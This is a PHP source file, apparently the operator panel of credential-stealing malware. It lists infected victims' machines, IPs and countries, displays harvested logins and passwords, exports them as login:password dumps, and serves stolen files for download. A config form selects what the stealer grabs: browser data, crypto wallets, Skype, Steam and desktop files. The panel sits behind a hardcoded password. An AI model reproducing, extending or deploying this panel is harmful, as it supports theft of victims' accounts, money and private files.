<?php
	include "config.php";
	include "functions.php";
	
	$pwd = "13371488";
	
	function SetConfig(){
			if (@$_POST['IS_G_PWDS']=="1") $IS_G_PWDS = "1"; else $IS_G_PWDS = "0";
			if (@$_POST['IS_G_DOUBLE']=="1") $IS_G_DOUBLE = "1"; else $IS_G_DOUBLE = "0";
			if (@$_POST['IS_G_BROWSERS']=="1") $IS_G_BROWSERS = "1"; else $IS_G_BROWSERS = "0";
			if (@$_POST['IS_G_COINS']=="1") $IS_G_COINS = "1"; else $IS_G_COINS = "0";
			if (@$_POST['IS_G_SKYPE']=="1") $IS_G_SKYPE = "1"; else $IS_G_SKYPE = "0";
			if (@$_POST['IS_G_STEAM']=="1") $IS_G_STEAM = "1"; else $IS_G_STEAM = "0";
			if (@$_POST['IS_G_DESKTOP']=="1") $IS_G_DESKTOP = "1"; else $IS_G_DESKTOP = "0";
			if (isset($_POST['G_DESKTOP_EXTS'])) $G_DESKTOP_EXTS = $_POST['G_DESKTOP_EXTS']; else $G_DESKTOP_EXTS = "||";
			if (isset($_POST['G_DESKTOP_MAXSIZE'])) $G_DESKTOP_MAXSIZE = $_POST['G_DESKTOP_MAXSIZE']; else $G_DESKTOP_EXTS = "0";
			
			
			$res="";
			$res .="IS_G_PWDS: $IS_G_PWDS\r\n";
			$res .="IS_G_DOUBLE: $IS_G_DOUBLE\r\n";
			$res .="IS_G_BROWSERS: $IS_G_BROWSERS\r\n";
			$res .="IS_G_COINS: $IS_G_COINS\r\n";
			$res .="IS_G_SKYPE: $IS_G_SKYPE\r\n";
			$res .="IS_G_STEAM: $IS_G_STEAM\r\n";
			$res .="IS_G_DESKTOP: $IS_G_DESKTOP\r\n";
			$res .="G_DESKTOP_EXTS: $G_DESKTOP_EXTS\r\n";
			$res .="G_DESKTOP_MAXSIZE: $G_DESKTOP_MAXSIZE\r\n";
			
			WriteToFile('cfg.txt', $res);			
			
	};
		
	function GeneratePageReports($filter,$datefrom,$dateup, $page){
			include "config.php";

			$table_data='<table class="reports-table">
				   <tr>
					<th>Date</th>
					<th>Computer</th>
					<th>IP addr</th>
					<th>OS</th>
					<th>Machine ID</th>
					<th>Report ID</th>
					<th>Report</th>
				  </tr>';
			$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
			mysql_select_db($database_name) or die('No database');
			if ($page=="")$page=0;
			$query = "SELECT COUNT(1) FROM reports";
			$count=mysql_fetch_array(mysql_query($query))[0];
			//echo "Count: $count";
			$x = $page*$reports_show_count;
			//if ($page!="")
				//$query = "SELECT * FROM reports ORDER BY date DESC LIMIT $x, $reports_show_count"; else  //LIMIT $page, $reports_show_count 
				$query = "SELECT * FROM reports ORDER BY date DESC";
			$result = mysql_query($query) or die('Bad query: ' . mysql_error());
			
			while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
				$id = $line["id"];
				$date = $line["date"];
				$username = $line["username"];
				$compname = $line["compname"];
				$ip = $line["ip"];
				$country = strtolower($line["country"]);
				$os = $line["os"];
				$machine_id = $line["machine_id"];
				$file = $line["file"];
				
				$flag = TRUE;
				
				if (($datefrom!="") and ($flag == TRUE)){
					if (strtotime($date)>=strtotime($datefrom)) {$flag = TRUE;} else {$flag = FALSE;};
				}
				
				if (($dateup!="") and ($flag == TRUE)){
					if (strtotime($date)<=strtotime($dateup)+86400) {$flag = TRUE;} else {$flag = FALSE;};
				}
				
				
				
				
				if (($filter!="") and $flag == TRUE){
					$pos = strripos(implode($line, "	"), $filter);
					if ($pos === false) {
						$flag = false;
					} else {
						$flag = TRUE;
					}
				}
				
				$reportlink="?search=&page=passwords&soft_type1=1&soft_type2=1&soft_type3=1&soft_type4=1&report_id_g=$id";
				@$filesize = human_filesize(@filesize("./files/$file"));	
				if ($flag==TRUE) $table_data.="<tr>
					<td>$date</td>
					<td>$compname($username)</td>
					<td><img src='img/flags/$country.png'> $ip (".strtoupper($country).")</td>
					<td>$os</td>
					<td>$machine_id</td>
					<td>$id</td>
					<td><a href='$reportlink'>Open</a> | <a href='files/$file' download>Dwnld $filesize</a></td>
				</tr>";
					//var_dump($line);
			}
			$table_data.="</table>";
			mysql_free_result($result);
			mysql_close($link);
			return $table_data;
	};
	
	
	function GeneratePagePasswords($filter, $c1, $c2, $c3, $c4, $report_id_g, $datefrom,$dateup){
		$txt='';
		if($report_id_g == "") $report_id_g = @$_GET['report_id_g'];
			include "config.php";
			$table_data='<table class="reports-table">
				   <tr>
					<th>Soft</th>
					<th>URL</th>
					<th>Login</th>
					<th>Password</th>
					<th>Report ID</th>
				  </tr>';
			$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
			mysql_select_db($database_name) or die('No database');
			//if ($page=="")$page=0;
			$query = "SELECT COUNT(1) FROM passwords";
			$count=mysql_fetch_array(mysql_query($query))[0];
			//echo "Count: $count";
			//$x = $page*$reports_show_count;
			//if ($page!="")
				//$query = "SELECT * FROM reports ORDER BY date DESC LIMIT $x, $reports_show_count"; else  //LIMIT $page, $reports_show_count 
				$query = "SELECT * FROM passwords, reports WHERE passwords.report_id=reports.id";
			$result = mysql_query($query) or die('Bad query: ' . mysql_error());
			while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
				$soft_type = $line["soft_type"];
				$soft_name = $line["soft_name"];
				$p1 = $line["p1"];
				$p2 = $line["p2"];
				$p3 = $line["p3"];
				$p4 = $line["p4"];
				$report_id = $line["report_id"];
				$date = $line['date'];
				
				$flag = true;
				
				if (($datefrom!="") and ($flag == TRUE)){
					if (strtotime($date)>=strtotime($datefrom)) {$flag = TRUE;} else {$flag = FALSE;};
				}
				
				if (($dateup!="") and ($flag == TRUE)){
					if (strtotime($date)<=strtotime($dateup)+86400) {$flag = TRUE;} else {$flag = FALSE;};
				}
				
				if ($flag==false) continue;
				
				
				if($report_id_g!="")
					if ($report_id_g!=$report_id) continue;
				
				$flag = false;
				if (($soft_type=="1")and($c1=="1")) $flag=true;
				if (($soft_type=="2")and($c2=="1")) $flag=true;
				if (($soft_type=="3")and($c3=="1")) $flag=true;
				if (($soft_type=="4")and($c4=="1")) $flag=true;
				
				if ($flag==false) continue;
				
				if ($filter!=""){
					$pos = strripos("$p1 $p2 $p3 $p4", $filter);
					if ($pos === false) {
						$flag = false;
					} else {
						$flag = TRUE;
					}
				}
				
				if (($flag==TRUE) and (@$_GET['txt']=="1")) $txt .= "$p2:$p3\r\n";	
				if ($flag==TRUE) $table_data.="<tr>
					<td><img src='img/softs/$soft_name.png'>$soft_name</td>
					<td>$p1</td>
					<td>$p2</td>
					<td>$p3</td>
					<td>$report_id</td>
				</tr>";
					//var_dump($line);
			}
			$table_data.="</table>";
			mysql_free_result($result);
			mysql_close($link);
			
			if (@$_GET['txt']=="1"){
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename=data.txt');
				header('Content-Transfer-Encoding: binary');
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . strlen($txt));
				echo @$txt;
				die;
			}; 
			return $table_data;
	};
	
	function ClearDatabase()
	{
		include "config.php";
		$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
		mysql_select_db($database_name) or die('No database');
		mysql_query("TRUNCATE TABLE `passwords`");
		mysql_query("TRUNCATE TABLE `reports`");
		mysql_close($link);
		
		if (file_exists('./files'))
		foreach (glob('./files/*') as $file)
		unlink($file);
		return "0";
	};
	
	
	function GetStats(){
			include "config.php";
			$date = date("Y-m-d");
			$res=array();
			$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
			mysql_select_db($database_name) or die('No database');	
			$res[0]=mysql_fetch_array(mysql_query("SELECT COUNT(1) FROM reports"))[0];
			$res[1]=mysql_num_rows(mysql_query("SELECT * FROM reports WHERE date LIKE '%$date%'"));
			
			$res[2]=mysql_fetch_array(mysql_query("SELECT COUNT(1) FROM passwords"))[0];
			$res[3]=mysql_num_rows(mysql_query("SELECT * FROM passwords WHERE soft_type = 1"));
			$res[4]=mysql_num_rows(mysql_query("SELECT * FROM passwords WHERE soft_type = 2"));
			$res[5]=mysql_num_rows(mysql_query("SELECT * FROM passwords WHERE soft_type = 3"));
			$res[6]=mysql_num_rows(mysql_query("SELECT * FROM passwords WHERE soft_type = 4"));
			mysql_close($link);
			return $res;
	};
	
	if (@$_POST['auth']=="1")
		if (@$_POST['password']==$pwd)
		{
			setcookie("pwd", md5($_POST['password']));
			header("Location: ".$_SERVER['PHP_SELF']);
		};
	
	if((@$_COOKIE["pwd"]) != md5($pwd)) die(FileToString('./html/login.html'));
	
	
	if (@$_POST['clear_database'] == '1') 
	{
		ClearDatabase();
		header("Location: ".$_SERVER["REQUEST_URI"]);
		
	};
	
	if (@$_POST['wtf'] == 'setconfig') 
	{
		SetConfig();
		header("Location: ".$_SERVER["REQUEST_URI"]);
		
	};
	
	
	
	$page = @$_GET['page'];
	if($page=="") $page="home";
	$page_data=FileToString('./html/fullpage.html');
	$menu_data=FileToString('./html/menu.html');
		if($page=="home"){ $menu_data=str_replace("%1%", "class='active has-sub'", $menu_data); 
			$page_data = str_replace("%PADE_DATA%", FileToString('./html/home.html'), $page_data);
			$stats = GetStats();
			$page_data = str_replace("%all_rep_c%", $stats[0], $page_data);
			$page_data = str_replace("%rep_today_c%", $stats[1], $page_data);
			$page_data = str_replace("%pwds_c%", $stats[2], $page_data);
			$page_data = str_replace("%br_pwds_c%", $stats[3], $page_data);	
			$page_data = str_replace("%ftp_pwds_c%", $stats[4], $page_data);	
			$page_data = str_replace("%mail_pwds_c%", $stats[5], $page_data);	
			$page_data = str_replace("%msg_pwds_c%", $stats[6], $page_data);
		
			$config = FileToString('./cfg.txt');
			if(pars($config, "IS_G_DOUBLE: ", "\r\n")=="1") 	$page_data = str_replace("%IS_G_DOUBLEchecked%", "checked", 	$page_data); else $page_data = str_replace("%IS_G_DOUBLEchecked%", "", 	$page_data);
			if(pars($config, "IS_G_PWDS: ", "\r\n")=="1") 		$page_data = str_replace("%IS_G_PWDSchecked%", "checked", 		$page_data); else $page_data = str_replace("%IS_G_PWDSchecked%", "", 		$page_data);
			if(pars($config, "IS_G_BROWSERS: ", "\r\n")=="1") 	$page_data = str_replace("%IS_G_BROWSERSchecked%", "checked", 	$page_data); else $page_data = str_replace("%IS_G_BROWSERSchecked%", "", 	$page_data);
			if(pars($config, "IS_G_COINS: ", "\r\n")=="1") 	$page_data = str_replace("%IS_G_COINSchecked%", "checked", 	$page_data); else $page_data = str_replace("%IS_G_COINSchecked%", "", 	$page_data);
			if(pars($config, "IS_G_SKYPE: ", "\r\n")=="1") 	$page_data = str_replace("%IS_G_SKYPEchecked%", "checked", 	$page_data); else $page_data = str_replace("%IS_G_SKYPEchecked%", "", 	$page_data);
			if(pars($config, "IS_G_STEAM: ", "\r\n")=="1") 	$page_data = str_replace("%IS_G_STEAMchecked%", "checked", 	$page_data); else $page_data = str_replace("%IS_G_STEAMchecked%", "", 	$page_data);
			if(pars($config, "IS_G_DESKTOP: ", "\r\n")=="1") 	$page_data = str_replace("%IS_G_DESKTOPchecked%", "checked", 	$page_data); else $page_data = str_replace("%IS_G_DESKTOPchecked%", "", 	$page_data);
			if(pars($config, "G_DESKTOP_EXTS: ", "\r\n")=="1") 	$page_data = str_replace("%IS_G_DESKTOPchecked%", "checked", 	$page_data); else $page_data = str_replace("%IS_G_DESKTOPchecked%", "", 	$page_data);
			$page_data = str_replace("%G_DESKTOP_EXTS%", pars($config, "G_DESKTOP_EXTS: ", "\r\n"),	$page_data);
			$page_data = str_replace("%G_DESKTOP_MAXSIZE%", pars($config, "G_DESKTOP_MAXSIZE: ", "\r\n"),	$page_data);
			
		};
		if($page=="reports") {
			$menu_data=str_replace("%2%", "class='active has-sub'", $menu_data);
			$page_data = str_replace("%PADE_DATA%", FileToString('./html/reports.html').GeneratePageReports(@$_GET['search'],@$_GET['datefrom'],@$_GET['dateup'],""), $page_data);
			$page_data = str_replace("%search%", @$_GET['search'], $page_data);
			$page_data = str_replace("%datefrom%", @$_GET['datefrom'], $page_data);		
			$page_data = str_replace("%dateup%", @$_GET['dateup'], $page_data);			
		};
		
		
		if($page=="passwords") {
			$menu_data=str_replace("%3%", "class='active has-sub'", $menu_data); 
			$page_data = str_replace("%PADE_DATA%", FileToString('./html/passwords.html').GeneratePagePasswords(@$_GET['search'], @$_GET['soft_type1'], @$_GET['soft_type2'], @$_GET['soft_type3'], @$_GET['soft_type4'], "", @$_GET['datefrom'],@$_GET['dateup']), $page_data);
			$page_data = str_replace("%search%", @$_GET['search'], $page_data);
			if (@$_GET['soft_type1']=='1'){$page_data = str_replace("%chk1%", "checked", $page_data);};
			if (@$_GET['soft_type2']=='1'){$page_data = str_replace("%chk2%", "checked", $page_data);};
			if (@$_GET['soft_type3']=='1'){$page_data = str_replace("%chk3%", "checked", $page_data);};
			if (@$_GET['soft_type4']=='1'){$page_data = str_replace("%chk4%", "checked", $page_data);};
			$page_data = str_replace("%datefrom%", @$_GET['datefrom'], $page_data);		
			$page_data = str_replace("%dateup%", @$_GET['dateup'], $page_data);			
			
		};
		
		if($page=="logout") {
			setcookie("pwd", "");
			header("Location: ".$_SERVER['PHP_SELF']);	
		};
	$page_data = str_replace("%MENU%", $menu_data, $page_data);
	echo $page_data;
	
		
	
	
	
	
	
	
	//GeneratePageReports('5','');
?>